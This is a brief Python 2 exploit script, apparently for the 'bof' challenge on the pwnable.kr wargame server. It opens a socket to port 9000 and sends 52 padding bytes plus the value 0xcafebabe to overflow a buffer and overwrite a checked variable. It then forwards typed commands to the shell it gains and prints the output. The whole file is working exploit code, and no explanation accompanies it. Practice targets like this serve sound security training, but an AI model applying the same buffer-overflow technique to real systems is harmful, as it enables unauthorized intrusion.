import socket
hostname = 'pwnable.kr'
port = 9000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname,port))
sock.send("a"*52 + "\xbe\xba\xfe\xca" +"\x0a")
while True:
    sock.send(raw_input() + "\x0a")
    print sock.recv(1024)

sock.close()
